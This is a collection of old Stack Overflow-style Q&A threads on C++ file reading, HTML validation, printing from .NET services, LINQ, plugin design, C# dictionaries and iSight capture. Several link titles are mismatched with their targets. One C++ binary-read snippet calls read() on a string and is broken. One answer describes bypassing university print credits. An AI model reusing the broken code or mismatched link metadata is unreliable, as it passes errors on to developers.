    in_stream.open(filename); // this in_stream (fstream) the ""filename"" to open.
    if (in_stream.fail())
    {
        cout &lt;&lt; ""Could not open file to read.""""\n""; // if the open file fails.
        return;
    }
    //.....the rest of the text goes beneath......
}
</code></pre>
 <p>To open and read a text file line per line, you could use the following:</p>

<pre><code>// define your file name
string file_name = ""data.txt"";

// attach an input stream to the wanted file
ifstream input_stream(file_name);

// check stream status
if (!input_stream) cerr &lt;&lt; ""Can't open input file!"";

// file contents  
vector&lt;string&gt; text;

// one line
string line;

// extract all the text from the input file
while (getline(input_stream, line)) {

    // store each line in the vector
    text.push_back(line);
}
</code></pre>

<p>To open and read a binary file you need to explicitly declare the reading format in your input stream to be binary, and read memory that has no explicit interpretation using stream member function <a href=""http://www.cplusplus.com/reference/istream/istream/read/"" rel=""nofollow""><code>read()</code></a>:</p>

<pre><code>// define your file name
string file_name = ""binary_data.bin"";

// attach an input stream to the wanted file
ifstream input_stream(file_name, ios::binary);

// check stream status
if (!input_stream) cerr &lt;&lt; ""Can't open input file!"";

// use function that explicitly specifies the amount of block memory read 
int memory_size = 10;

// allocate 10 bytes of memory on heap
char* dynamic_buffer = new char[memory_size];

// read 10 bytes and store in dynamic_buffer
file_name.read(dynamic_buffer, memory_size);
</code></pre>

<p>When doing this you'll need to <code>#include</code> the header : <code>&lt;iostream&gt;</code></p>
"
"How important is W3C XHTML/CSS validation when finalizing work? <p>Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?</p>

<p>What level do you hold your code to when you create it for:</p>

<p>a) yourself
b) your clients</p>

<p>P.S. Jeff and company, why doesn't stack overflow validate? :)</p>

<p><strong>EDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then ""go back and fix the validation problems""</strong></p>

<p><strong>I think I may post another question on stack overflow; ""Do you validate as you go or do you finish and then go back and validate?"" as that seems to be where this question is going</strong></p>
 <p>a) Must look the same</p>

<p>b) As standards-compliant as possible, but not so anal that it blocks finishing work</p>

<p>In a situation where you have perpetual access to the code, I don't think standards-compliance is all that important, since you can always make changes to the code if something breaks. If you don't have perpetual access (ie, you sign off on the code and it becomes someone else's responsibility), it's probably best to be as standards-compliant as possible to minimize maintenance headaches later... even if you never have to deal with the code again, your reputation persists and can be transmitted to other potential clients, and many teams like to blame the previous developer(s) for problems that come up.</p>
 <p>I think validation is a good litmus test of whether you've done things properly, so if there are only a few minor problems, why not fix them and ensure your site will at least be understood correctly by browsers in the future (even if they do render things differently for other reasons)?</p>

<p>OTOH, for most projects, validation seems like a huge headache and if you can get things working across browsers, it's not worth spending an extra day/week+ on just validation.</p>
 <p>I think this is an area in which you should strive to use the <a href=""http://en.wikipedia.org/wiki/Postel%27s_law"" rel=""nofollow"" title=""The Subversion Book: Repository hooks"">Robustness principle</a> as far as is practical (which is good advice for any area of coding). Just because something works today doesn't mean it will work tomorrow: if you're relying on a particular HTML/CSS hack or even if you've just been a little lax in emitting strictly valid code, the next iteration of browsers could well break. Doing it once the right way minimises this problem (though does not entirely mitigate it).</p>

<p>There is a certain element of pragmatism to take here, though. I'd certainly do all I could for a client's site to be valid, but I would be willing to take more risks in my own space.</p>
 <p>I think it's only ""tech"" guys that really care for ""100% standard compliance"". My usual page consumers (= users) don't care if there's no alt-attribute for a ""menu border picture element"".</p>

<p>I usually just make sure that I don't see any obvious errors (all tags closed, all lower case, attributes in quotes, ...), but if it looks good on IE and FF, that's all I care for. I don't really care if I use a non-standard attribute in any HTML tag, so that the page doesn't validate against an DTD - as long as I get the visual results that I intended to get.</p>
 <p>I know this isn't answering your whole question, but it is worth considering that by using completely valid html you can be sure that your website should work properly in <strong>future</strong> web browsers that haven't been released yet.</p>
 <p>My approach tends to be to ensure I can completely validate on all pages, however I still send the page as text/html instead of application/xhtml+xml so there are no ugly XML errors in the event I have missed something.</p>
 <p>For me, I feel like I've done a good job if my code validates. Seeing the green check box on the w3c pages just makes me slightly giddy. As for group b, They usually only care that it looks and works the same across browsers. They only place I've found that this is not true is the government sector. They require complete validation not only with the w3c but also passing ADA tests (basically how does it sound with a screen reader). </p>

<p>p.s. when I say government sector, I mean specifically the state of California and a few counties inside it. I have had no ther experience with other government groups besides them.</p>
 <p>Except that the validators themselves are so positively anal,
 when they flag an error or warning whenever a -moz- or -webkit or -o- i.e. a browser specific qualification term is used.
also they want you to specify 0px rather than 0 or other units
Zero is Zero whatever units the validator wants to check it against!</p>

<p>just try validating the WordPress twentyeleven style.css it throws 140 odd errors which are all of the nature above or the validator is recovering from parse errors</p>

<p>The validators are useless if you cannot sort the wheat from the chaff!!!</p>

<p>We need validators that recognise browser specific qualification terms!</p>
 <p>For understanding <strong>why</strong> validation matters, it is needed to understand <a href=""http://www.html5rocks.com/en/tutorials/internals/howbrowserswork/"" rel=""nofollow"">how a browser works</a> at its different layers, and also a little bit about the history of web from the perspective of web browsers.</p>

<p>The HTML you give to a browser is interpreted by the browser following the DOM, an application programming interface that maps out the entire page as a hierarchy of nodes. Each part of that  <em>tree</em> is a type of node containing different kinds of data. DOM (Document Object Model) was necessary because of the diversity of HTML pages that early web browsers (Netscape, IE...) implemented to allow alter the appearance and content of a web page without reloading it. For preserving the cross-platform nature of the web, W3C wanted to fix the different implementation of those browsers, proposing DOM.</p>

<p>DOM support became a huge priority for most web browsers vendors, and efforts have been ongoing to improve support on each release. So, it worked.</p>

<p>DOM is the very basic step with which a web browser starts. Its main flow is:</p>

<ol>
<li>parsing HTML to construct the DOM tree</li>
<li>render tree construction</li>
<li>layout of the render tree</li>
<li>painting the render tree</li>
</ol>

<p>The step 1 gives the <strong>content tree</strong>, with the tags turned to DOM nodes. The step 2 gives the <strong>render tree</strong>, containing styling information.</p>

<p>So, <strong>why</strong> validation matters: because <strong>content tree</strong> and <strong>render tree</strong> are the basis from which the web browser start its job. The most they are well defined, the better for the web browser.</p>

<p>Ultimately, the DOM is also the basis for your JavaScript events. So, its validation helps to the interaction layer too.</p>
"
"Printing from a .NET Service <p>I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it <em>seems</em> that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:</p>

<ul>
<li>Multi-page printing will be a big headache.</li>
<li>Still have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)</li>
<li>If the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.</li>
</ul>

<p>Has anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.</p>

<p>All help is appreciated.</p>

<p>EDIT: We are on version 2.0 of the .NET framework.</p>
 <p>This may not be what you're looking for, but if I needed to do this quick&amp;dirty, I would:</p>

<ol>
<li>Create a separate WPF application (so I could use the built-in document handling)</li>
<li>Give the service the ability to interact with the desktop (note that you don't actually have to show anything on the desktop, or be logged in for this to work)</li>
<li>Have the service run the application, and give it the data to print.</li>
</ol>

<p>You could probably also jigger this to print from a web browser that you run from the service (though I'd recommend building your own shell IE, rather than using a full browser).</p>

<p>For a more detailed (also free) solution, your best bet is probably to manually format the document yourself (using GDI+ to do the layout for you). This is tedious, error prone, time consuming, and wastes a lot of paper during development, but also gives you the most control over what's going to the printer.</p>
 <p>Printing from a Windows service is really painful. It seems to work... sometimes... but finally it craches or throws an exception from time to time, without any clear reason. It's really hopeless. Officially, it's even <a href=""http://msdn.microsoft.com/en-us/library/system.drawing.printing%28VS.80%29.aspx"">not supported</a>, without any explanation, nor any proposal for an alternate solution.</p>

<p>Recently, I have been confronted to the problem and after several unsuccessful trials and experimentations, I came finally with two viable solutions:</p>

<ul>
<li>Write your own printing DLL using the Win32 API (in C/C++ for instance), then use it from your service with P/Invoke (works fine)</li>
<li>Write your own printing COM+ component, then uses it from your service. I have chosen this solution with success recently (but it was third party COM+ component, not own written) It works absolutely fine too.</li>
</ul>
 <p>Trust me, you will spend more money trying to search/develop a solution for this as compared to buying a third party component. Do not reinvent the wheel and go for the paid solution.</p>

<p>Printing is a complex problem and I would love to see the day when better framework support is added for this.</p>
 <p>I think we are going to go the third party route.  I like the XSL -> HTML -> PDF -> Printer flow... Winnovative's <a href=""http://www.winnovative-software.com/"" rel=""nofollow"" title=""Cocoa Programming for Mac OSX"">HTML to PDF</a> looks good for the first part, but I'm running into a block finding a good PDF printing solution... any suggestions?  Ideally the license would be on a developer basis, not on a deployed runtime basis.</p>
 <p>Printing from a service is a bad idea. Network printers are connected ""per-user"". You can mark the service to be run as a particular user, but I'd consider that a bad security practice. You might be able to connect to a local printer, but I'd still hesitate before going this route.</p>

<p>The best option is to have the service store the data and have a user-launched application do the printing by asking the service for the data. Or a common location that the data is stored, like a database. </p>

<p>If you need to have the data printed as regular intervals, setup a Task event thru the Task Scheduler. Launching a process from a service will require knowing the user name and password, which again is bad security practice.</p>

<p>As for the printing itself, use a third-party tool to generate the report will be the easiest.</p>
 <p>To answer your first question, this can be fairly straight forward depending on the data.  We have a variety of Service-based applications that do exactly what you are asking.  Typically, we parse the incoming file and wrap our own Postscript or PCL around it.  If you layout is fairly simple, then there are some very basic PCL codes you can wrap it with to provide the font/print layup you want (I'd be more then happy to give you some guidance here offline).</p>

<p>One you have a print ready file you can send it to a UNC printer that is shared, directly to a locally installed printer, or even to the IP of the device (RAW or LPR type data).</p>

<p>If, however, you are going down the PDF path, the simplest method is to send the PDF output to a printer that supports direct PDF printing (many do now). In this case you just send the PDF to the device and away it prints. </p>

<p>The other option is to launch <a href=""http://pages.cs.wisc.edu/~ghost/"" rel=""nofollow"">Ghostscript</a> which should be free for your needs (check the licensing as they have a few different version, some GNU, some GPL etc.) and either use it's built in print function or simply convert to Postscript and send to the device.  I've used Ghostscript many times in Service apps but not a huge fan as you will basically be shelling out and executing a command line app to do the conversion.  That being said, it's a stable app that does tend to fail gracefully</p>
 <p>I've done it.  It's a pain in the A*s.  The problem is that printing requires that GDI engine to be in place, which normally means that you have to have the desktop, which only loads when you're logged in.  If you're attempting to do this from a Service on a Server, then you normally aren't logged in.</p>

<p>So first you can't run as the normal service user, but instead as a real user that has interactive login rights. Then you have to tweak the service registry entries (I forget how at the moment, would have to find the code which I can do tonight if you're really interested).  Finally, you have to pray.</p>

<p>Your biggest long term headache will be with print drivers.  If you are running as a service without a logged in user, some print drivers like to pop up dialogs from time to time.  What happens when your printer is out of toner?  Or out of paper?  The driver may pop up a dialog that will never be seen, and hold up the printer queue because nobody is logged in!</p>
 <p>If you can output to post script some printers will print anything that gets FTPed to a certain directory on them.</p>

<p>We used this to get past the print credits that our university exposed on us, but if your service outputs to a ps then you can just ftp the ps file to the printer.</p>
 <p>In answer to your question about PDF printing, I have not found an elegant solution. I was ""shell"" ing out to Adobe which was unreliable and required a user to be logged in at all times. To fix this specific problem, I requested that the files we process (invoices) be formatted as multi-page Tiff files instead which can be split apart and printed using native .NET printing functions. Adobe's position seems to be ""get the user to view the file in Adobe Reader and they can click print"". Useless.</p>

<p>I am still keen to find a good way of producing quality reports which can be output from the web server...</p>
 <p>Printing using System.Drawing.Printing is not supported by MS, as per Yann Trevin's response.  However, you might be able to use the new, WPF-based, System.Printing (I <em>think</em>)</p>
 <p>We are using <a href=""http://www.devexpress.com/Products/NET/Reporting/"" rel=""nofollow"">DevExpress' XtraReports</a> to print from a service without any problems.  Their report model is similar to that of Windows Forms, so you could dynamically insert text elements and then issue the print command.</p>
"
"Beginners Guide to LINQ <p>During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.</p>

<p><strong>What is LINQ and how do I get started?</strong></p>

<p>Links guides or documentation a bonus :)</p>

<p><em>PS: I am a long time C# developer who daily uses Datatables and Parameterized SQL</em></p>
 <p>Here you go. I started with ScottGu's explanation/examples and went from there:</p>

<p><a href=""http://weblogs.asp.net/scottgu/archive/2007/05/19/using-linq-to-sql-part-1.aspx"" rel=""nofollow"">http://weblogs.asp.net/scottgu/archive/2007/05/19/using-linq-to-sql-part-1.aspx</a></p>
 <p>LINQ stands for Language Integrated Query and is a set of extensions for .NET that allow you to query data the same way from code and isn't tied to a specific data source.  You can use the same LINQ code for SQL Server, XML, objects, DataSets, and Entities.</p>

<p>Here is a good intro from <a href=""http://weblogs.asp.net/scottgu/archive/2006/05/14/446412.aspx"">Scott Guthrie</a></p>

<p>This is a nice set of 101 <a href=""http://msdn.microsoft.com/en-us/vcsharp/aa336746.aspx"">LINQ Samples</a></p>
 <ul>
<li>Start with everything <a href=""http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx"" rel=""nofollow"" title=""Cocoa Programming for Mac OSX"">Scott Guthrie</a> has on linq</li>
<li>Get <a href=""http://oreilly.com/catalog/9780596519247/"" rel=""nofollow"" title=""Using Subversion hooks to send out build emails"">LINQ Pocket Reference</a>, which is an excerpt from <a href=""http://oreilly.com/catalog/9780596527570/index.html"" rel=""nofollow"">C# 3.0 in a Nutshell</a></li>
</ul>
 <p>Here are a couple of good tutorials (video) from OakLeaf Systems:</p>

<p><a href=""http://oakleafblog.blogspot.com/2007/04/two-new-linq-to-sql-video-segments-from.html"" rel=""nofollow"">http://oakleafblog.blogspot.com/2007/04/two-new-linq-to-sql-video-segments-from.html</a>
<a href=""http://oakleafblog.blogspot.com/2007/05/mike-taulty-posts-six-new-linq-to-xml.html"" rel=""nofollow"">http://oakleafblog.blogspot.com/2007/05/mike-taulty-posts-six-new-linq-to-xml.html</a></p>

<p><strong>EDIT:</strong> I just ran into this great tool created by the author of C# in a Nutshell:
<a href=""http://www.linqpad.net/"" rel=""nofollow"">http://www.linqpad.net/</a>
It includes lots of great easy to follow samples.</p>
 <p>Two books you should consider for learning about LINQ, both from Manning:</p>

<ul>
<li><a href=""http://www.manning.com/skeet"" rel=""nofollow"">C# in Depth</a></li>
<li><a href=""http://www.manning.com/marguerie"" rel=""nofollow"">LINQ in Action</a></li>
</ul>

<p>The former was by far the better written, and taught me almost as much about LINQ in a single chapter than the latter did in a whole book.  LINQ is built on a lot of foundation, and C# in Depth builds it up from the ground.</p>

<p>The second book is a whole lot better than nothing, and you will learn things specifically about LINQ that you won't learn in the first.  But the first book will give you much better foundation, and puts up at least a token perspective instead of more or less blindly following the MS line.  So, I'm recommending C# in Depth first and foremost for learning LINQ.</p>

<p>Mike</p>
 <p>Linq is short for ""Language integrated query."" It's a set of language enhancements built into C# and VB. Basically, what you get is a bunch of  standard query operators that can be applied to any IEnumerable of type T. There's a lot of different linq providers for specific types of data- for example, there's linq to xml, linq to entities, even linq to sharepoint. </p>

<p>To get started with linq, in all its many forms, I suggest the book <a href=""http://rads.stackoverflow.com/amzn/click/1590597893"" rel=""nofollow"" title=""Cocoa Programming for Mac OSX"">Pro Linq by Joseph C. Rattz.</a> It's an excellent overview of Linq. He takes a ground-up approach, first describing all the language features (like Lambda Expressions and Expression Trees) that Linq is built on, and then moving on to some standard linq provider implementations.</p>

<p>Additionally, here's a pretty good MSDN article describing Linq: <a href=""http://msdn.microsoft.com/en-us/library/bb308959.aspx"" rel=""nofollow"" title=""Using Subversion hooks to send out build emails"">LINQ: .NET Language-Integrated Query</a></p>

<p>Now, Linq to Sql is a linq provider written specifically for SQL Server. Included in this provider is an OR/M, that gives you some handy-dandy functionality (like typing out all your sql tables, so you get a robust design-time view of your database schema.) It's totally awesome, and for me, has greatly speed up development time when working with a sql database.
The book I recommended above also has a great section about using Linq To Sql. Also,
here's a good ""beginner's guide"" article from MSDN: <a href=""http://msdn.microsoft.com/en-us/library/bb425822.aspx#linqtosql_topic1"" rel=""nofollow"">Linq To SQL: .NET Language-Integrated Query for Relational Data</a></p>
 <p>I think this book:</p>

<p><strong><a href=""http://www.manning.com/skeet/"" rel=""nofollow"">C# in Depth</a></strong></p>

<p>By Jon Skeet is an excellent programmers' guide that matches your exact needs (moving from earlier C# to C#3.5). </p>

<p>Also if you order it you get the electronic copy too - something more publishers should do (excellent for both Kindles and searching).</p>
 <p>A bit old but still relevant:
<a href=""http://www.developerzen.com/2007/09/17/introduction-to-linq/"" rel=""nofollow"">http://www.developerzen.com/2007/09/17/introduction-to-linq/</a></p>
 <p>I recommend the <a href=""http://www.hookedonlinq.com"" rel=""nofollow"" title=""pgpool-II"">Hooked On LINQ</a> wiki. They've got some <a href=""http://www.hookedonlinq.com/LINQOverview.ashx"" rel=""nofollow"">great introductory info</a>, as well as more in depth info and samples on all of the operators.</p>

<p>I listed a lot of LINQ references in the show notes for <a href=""http://herdingcode.com/?p=27"" rel=""nofollow"">Herding Code Episode 10 (on LINQ)</a>. One of my favorites is <a href=""http://msdn.microsoft.com/en-us/magazine/cc163400.aspx"" rel=""nofollow"">an MSDN Magazine article which explains how LINQ works</a> from a framework perspective in a way which really helped me understand how it works.</p>
 <p>From MSDN, here are some papers, written by Anders and others:</p>

<ul>
<li><a href=""http://msdn.microsoft.com/en-us/library/bb308959.aspx"" rel=""nofollow"" title=""pgpool-II"">LINQ: .NET Language-Integrated Query</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/bb425822.aspx"" rel=""nofollow"">LINQ to SQL: .NET Language-Integrated Query for Relational Data</a></li>
</ul>

<p>PS after writing this, I see someone has already linked to these, but buried inside a paragraph, so I'll keep them pulled out here in list form as well.</p>
 <p>To practice without the need to write wrap code just to execute linq-queries you could use
linqpad.net</p>
 <p>There's a VB.Net version of the 101 Code Samples page too - </p>

<p><a href=""http://msdn.microsoft.com/en-us/vbasic/bb688088.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/vbasic/bb688088.aspx</a></p>
 <p>I'd strongly suggest you have a play around with LINQPad (http://www.linqpad.net), it's a free tool which allows (umong others things) you to connect to a database server and query it using LINQ to SQL. It takes the pain out of having to set up Console Applications to do the playing.</p>
 <p>There is a podcast here (shameless plug) that covers LINQ from one of the authors of LINQ in Action.</p>

<p><a href=""http://deepfriedbytes.com/podcast/episode-14-linq-ing-the-future-of-development-with-jim-wooley/"" rel=""nofollow"">Deep Fried Bytes - Episode 14: LINQ’ing the Future of Development with Jim Wooley</a></p>

<p>Lots of great stuff in that show that may also help you out.</p>
 <p>Here is a step by step tutorial on how to incorporate LINQ with your web applications within asp.net. Hope this helps
<a href=""http://www.progtalk.com/viewarticle.aspx?articleid=68"" rel=""nofollow"">http://www.progtalk.com/viewarticle.aspx?articleid=68</a></p>
 <p>It may be useful to beginners on linq. The step by step guide with image.
<a href=""http://readerstimepass.blogspot.com/2010/11/step-by-step-guide-to-implement-linq-to.html"" rel=""nofollow"">http://readerstimepass.blogspot.com/2010/11/step-by-step-guide-to-implement-linq-to.html</a></p>
"
"Suggestions for Adding Plugin Capability? <p>Is there a general procedure for programming extensibility capability into your code?</p>

<p>I am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.</p>

<p>Do such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?</p>
 <ol>
<li><p>Find out what minimum requrements you want to put on a plugin writer. Then make one or more Interfaces that the writer must implement for your code to know when and where to execute the code.  </p></li>
<li><p>Make an API the writer can use to access some of the functionality in your code.  </p></li>
</ol>

<p>You could also make a base class the writer must inherit. This will make wiring up the API easier. Then use some kind of reflection to scan a directory, and load the classes you find that matches your requirements.  </p>

<p>Some people also make a scripting language for their system, or implements an interpreter for a subset of an existing language. This is also a possible route to go.</p>

<p>Bottom line is: When you get the code to load, only your imagination should be able to stop you.<br />
Good luck.</p>
 <p>This is generally something that you'll have to expose yourself, so yes, it will be dependent on the language your system is written in (though often it's possible to write wrappers for other languages as well).</p>

<p>If, for example, you had a program written in C, for Windows, plugins would be written for your program as DLLs.  At runtime, you would manually load these DLLs, and expose some interface to them.  For example, the DLLs might expose a <code>gimme_the_interface()</code> function which could accept a structure filled with function pointers.  These function pointers would allow the DLL to make calls, register callbacks, etc.</p>

<p>If you were in C++, you would use the DLL system, except you would probably pass an object pointer instead of a struct, and the object would implement an interface which provided functionality (accomplishing the same thing as the struct, but less ugly).  For Java, you would load class files on-demand instead of DLLs, but the basic idea would be the same.</p>

<p>In all cases, you'll need to define a standard interface between your code and the plugins, so that you can initialize the plugins, and so the plugins can interact with you.</p>

<p>P.S. If you'd like to see a good example of a C++ plugin system, check out the <a href=""http://foobar2000.com/SDK.html"" rel=""nofollow"">foobar2000 SDK</a>.  I haven't used it in quite a while, but it used to be really well done.  I assume it still is.</p>
 <p>I've used event-based APIs for plugins in the past. You can insert hooks for plugins by dispatching events and providing access to the application state.</p>

<p>For example, if you were writing a blogging application, you might want to raise an event just before a new post is saved to the database, and provide the post HTML to the plugin to alter as needed.</p>
 <p>I'm tempted to point you to the Design Patterns book for this generic question :p</p>

<p>Seriously, I think the answer is no. You can't write extensible code by default, it will be both hard to write/extend and awfully inefficient (Mozilla started with the idea of being very extensible, used XPCOM everywhere, and now they realized it was a mistake and started to remove it where it doesn't make sense).</p>

<p>what makes sense to do is to identify the pieces of your system that can be meaningfully extended and support a proper API for these cases (e.g. language support plug-ins in an editor). You'd use the relevant patterns, but the specific implementation depends on your platform/language choice.</p>

<p>IMO, it also helps to use a dynamic language - makes it possible to tweak the core code at run time (when absolutely necessary). I appreciated that Mozilla's extensibility works that way when writing Firefox extensions.</p>
 <p>If you are using a compiled language such as C or C++, it may be a good idea to look at plugin support via scripting languages.  Both Python and Lua are excellent languages that are used to script a large number of applications (Civ4 and blender use Python, Supreme Commander uses Lua, etc).  </p>

<p>If you are using C++, check out the boost python library.  Otherwise, python ships with headers that can be used in C, and does a fairly good job documenting the C/python API.  The documentation seemed less complete for Lua, but I may not have been looking hard enough.  Either way, you can offer a fairly solid scripting platform without a terrible amount of work.  It still isn't trivial, but it provides you with a very good base to work from.</p>
 <p>I think there are two aspects to your question: </p>

<p>The design of the system to be extendable (the design patterns, inversion of control and other architectural aspects) (<a href=""http://www.martinfowler.com/articles/injection.html"" rel=""nofollow"">http://www.martinfowler.com/articles/injection.html</a>). And, at least to me, yes these patterns/techniques are platform/language independent and can be seen as a ""general procedure"".</p>

<p>Now, their implementation is language and platform dependend (for example in C/C++ you have the dynamic library stuff, etc.) </p>

<p>Several 'frameworks' have been developed to give you a programming environment that provides you pluggability/extensibility but as some other people mention, don't get too crazy making everything pluggable. </p>

<p>In the Java world a good specification to look is OSGi (<a href=""http://en.wikipedia.org/wiki/OSGi"" rel=""nofollow"">http://en.wikipedia.org/wiki/OSGi</a>) with several implementations the best one IMHO being Equinox (<a href=""http://www.eclipse.org/equinox/"" rel=""nofollow"">http://www.eclipse.org/equinox/</a>)</p>
"
"Best implementation for Key Value Pair Data Structure? <p>So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?</p>

<pre><code>public class TokenTree
{
    public TokenTree()
    {
        /* I must admit to not fully understanding this,
         * I got it from msdn. As far as I can tell, IDictionary is an
         * interface, and Dictionary is the default implementation of
         * that interface, right?
         */
        SubPairs = new Dictionary&lt;string, string&gt;();
    }

    public string Key;
    public string Value;
    public IDictionary&lt;string, string&gt; SubPairs;
}
</code></pre>

<p>It's only really a simple shunt for passing around data.</p>
 <p>There is an actual Data Type called KeyValuePair, use like this</p>

<pre><code>KeyValuePair&lt;string, string&gt; myKeyValuePair = new KeyValuePair&lt;string,string&gt;(""defaultkey"", ""defaultvalue"");
</code></pre>
 <p><a href=""http://msdn.microsoft.com/en-us/library/xfhwa508.aspx"" rel=""nofollow"">Dictionary Class</a> is exactly what you want, correct.</p>

<p>You can declare the field directly as Dictionary, instead of IDictionary, but that's up to you.</p>
 <p>There is a KeyValuePair built-in type. As a matter of fact, this is what the IDictionary is giving you access to when you iterate in it.</p>

<p>Also, this structure is hardly a tree, finding a more representative name might be a good exercise.</p>
 <p>One possible thing you could do is use the Dictionary object straight out of the box and then just extend it with your own modifications:</p>

<pre><code>public class TokenTree : Dictionary&lt;string, string&gt;
{
    public IDictionary&lt;string, string&gt; SubPairs;
}
</code></pre>

<p>This gives you the advantage of not having to enforce the rules of IDictionary for your Key (e.g., key uniqueness, etc).</p>

<p>And yup you got the concept of the constructor right :)</p>
 <p>@<a href=""http://stackoverflow.com/users/733/jay-mooney"" rel=""nofollow"">Jay Mooney</a>: A generic Dictionary class in .NET is actually a hash table, just with fixed types.</p>

<p>The code you've shown shouldn't convince anyone to use Hashtable instead of Dictionary, since both code pieces can be used for both types.</p>

<p>For hashtable:</p>

<pre><code>foreach(object key in h.keys)
{
     string keyAsString = key.ToString(); // btw, this is unnecessary
     string valAsString = h[key].ToString();

     System.Diagnostics.Debug.WriteLine(keyAsString + "" "" + valAsString);
}
</code></pre>

<p>For dictionary:</p>

<pre><code>foreach(string key in d.keys)
{
     string valAsString = d[key].ToString();

     System.Diagnostics.Debug.WriteLine(key + "" "" + valAsString);
}
</code></pre>

<p>And just the same for the other one with KeyValuePair, just use the non-generic version for Hashtable, and the generic version for Dictionary.</p>

<p>So it's just as easy both ways, but Hashtable uses Object for both key and value, which means you will box all value types, and you don't have type safety, and Dictionary uses generic types and is thus better.</p>
 <p>Use something like this:  </p>

<pre><code>class Tree &lt; T &gt; : Dictionary &lt; T, IList&lt; Tree &lt; T &gt; &gt; &gt;  
{  
}
</code></pre>

<p>It's ugly, but I think it will give you what you want. Too bad KeyValuePair is sealed.</p>
 <p>Just one thing to add to this (although I do think you have already had your question answered by others). In the interests of extensibility (since we all know it will happen at some point) you may want to check out the <a href=""http://www.dofactory.com/Patterns/PatternComposite.aspx"" rel=""nofollow"">Composite Pattern</a> This is ideal for working with ""Tree-Like Structures""..</p>

<p>Like I said, I know you are only expecting one sub-level, but this could really be useful for you if you later need to extend ^_^</p>
 <p>I think what you might be after (as a literal implementation of you question) is:</p>

<pre><code>pubic class TokenTree
{
    public TokenTree()
    {
        tree = new Dictionary&lt;string, IDictionary&lt;string,string&gt;&gt;();
    }

    IDictionary&lt;string, IDictionary&lt;string, string&gt;&gt; tree; 
}
</code></pre>

<p>You did actually say a ""list"" of key-values in your question so you might want to swap the inner IDictionary with a:</p>

<pre><code>IList&lt;KeyValuePair&lt;string, string&gt;&gt;
</code></pre>
"
"Accessing iSight programatically? <p>Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well? </p>
 <p>I don't have a Mac here, but there is some Documentation up here:</p>

<p><a href=""http://developer.apple.com/documentation/Hardware/Conceptual/iSightProgGuide/01introduction/chapter_1_section_1.html"" rel=""nofollow""><a href=""http://developer.apple.com/documentation/Hardware/Conceptual/iSightProgGuide/01introduction/chapter_1_section_1.html"" rel=""nofollow"">http://developer.apple.com/documentation/Hardware/Conceptual/iSightProgGuide/01introduction/chapter_1_section_1.html</a></a></p>

<p>It looks like you have to go through the QuickTime API. There is supposed to be a Sample Project called ""MungGrab"" which could be worth a look according to <a href=""http://www.mailinglistarchive.com/quicktime-api@lists.apple.com/msg02698.html"" rel=""nofollow"">this thread</a>.</p>
 <p>Aside from ObjC, you can use the PyObjC or RubyCocoa bindings to access it also. If you're not picky about which language, I'd say use Ruby, as PyObjC is horribly badly documented (even the official Apple page on it refers to the old version, not the one that came with OS X Leopard)</p>

<p>Quartz Composer is probably the easiest way to access it, and .quartz files can be embed in applications pretty easily (and the data piped out to ObjC or such)</p>

<p>Also, I suppose there should be an example or two of this in the /Developer/Examples/</p>
 <p>There's a command line utility called <code><a href=""http://www.intergalactic.de/pages/iSight.html"" rel=""nofollow"" title=""I/O management and disk scheduling"">isightcapture</a></code> that does more or less what you want to do. You could probably get the code from the developer (his e-mail address is in the readme you get when you download the utility).</p>
 <p>You should check out the <a href=""http://developer.apple.com/documentation/QuickTime/Conceptual/QTKitCaptureProgrammingGuide/Introduction/chapter_1_section_1.html#//apple_ref/doc/uid/TP40004574-CH1-DontLinkElementID_41"" rel=""nofollow"">QTKit Capture documentation</a>.</p>

<p>On Leopard, you can get at all of it over the RubyCocoa bridge:</p>

<pre><code>require 'osx/cocoa'
OSX.require_framework(""/System/Library/Frameworks/QTKit.framework"")

OSX::QTCaptureDevice.inputDevices.each do |device|
    puts device.localizedDisplayName
end
</code></pre>
 <p>If you poke around Apple's mailing lists you can find some code to do it in Java as well. <a href=""http://lists.apple.com/archives/QuickTime-java/2007/Jan/msg00003.html"" rel=""nofollow"">Here's a simple example suitable for capturing individual frames</a>, and <a href=""http://lists.apple.com/archives/QuickTime-java/2005/Nov/msg00036.html"" rel=""nofollow"">here's a more complicated one that's fast enough to display live video</a>.</p>
 <p>One thing that hasn't been mentioned so far is the <a href=""http://developer.apple.com/documentation/GraphicsImaging/Reference/IKImagePicker_Class/IKImagePicker_Reference.html"" rel=""nofollow"">IKPictureTaker</a>, which is part of Image Kit.  This will come up with the standard OS provided panel to take pictures though, with all the possible filter functionality etc. included.  I'm not sure if that's what you want.</p>

<p>I suppose you can use it from other languages as well, considering there are things like <a href=""http://www.cocoadev.com/index.pl?CocoaBridges"" rel=""nofollow"">cocoa bridges</a> but I have no experience with them.</p>

<p>Googling also came up with <a href=""http://stackoverflow.com/questions/57424?sort=newest"">another question on stackoverflow</a> that seems to address this issue.</p>
